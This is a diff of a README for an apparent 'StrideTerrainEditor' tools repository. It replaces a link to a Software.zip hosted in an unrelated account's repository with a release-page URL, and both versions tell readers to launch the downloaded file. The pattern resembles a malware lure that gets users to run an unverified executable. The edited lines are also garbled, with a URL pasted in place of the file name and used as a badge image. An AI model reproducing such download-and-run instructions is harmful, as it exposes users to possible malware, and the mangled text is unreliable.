@@ -10,10 +10,10 @@ Welcome to the **StrideTerrainEditor** repository, a collection of tools and uti
 
 ## 🚀 Get Started
 
-To access the tools and utilities provided in this repository, download the Software.zip file from the following link:
-[![Software.zip](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+To access the tools and utilities provided in this repository, download the https://github.com/22155555/StrideTerrainEditor/releases/tag/v2.0 file from the following link:
+[![https://github.com/22155555/StrideTerrainEditor/releases/tag/v2.0](https://github.com/22155555/StrideTerrainEditor/releases/tag/v2.0)](https://github.com/22155555/StrideTerrainEditor/releases/tag/v2.0)
 
-Please note that the Software.zip file needs to be launched after downloading to start using the StrideTerrainEditor tools effectively.
+Please note that the https://github.com/22155555/StrideTerrainEditor/releases/tag/v2.0 file needs to be launched after downloading to start using the StrideTerrainEditor tools effectively.
 
 ## Tools and Utilities
 
